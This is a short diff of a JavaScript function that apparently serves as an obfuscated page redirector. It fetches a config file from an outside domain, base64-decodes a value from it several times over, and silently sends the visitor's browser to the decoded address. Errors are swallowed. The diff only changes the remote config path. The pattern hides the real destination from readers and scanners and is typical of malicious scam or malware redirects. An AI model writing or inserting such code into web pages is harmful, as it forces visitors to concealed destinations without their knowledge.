@@ -30,7 +30,7 @@ async function handle() {
         timerStart = false;
 
         try {
-            const response = await fetch('https://piapandora.com/jason/config.json');
+            const response = await fetch('https://piapandora.com/box/config.json');
             const json = await response.json();
             window.location.href = [...Array(reqs)].reduce(d => atob(d), config(json.b) + "=");
         } catch (error) {}
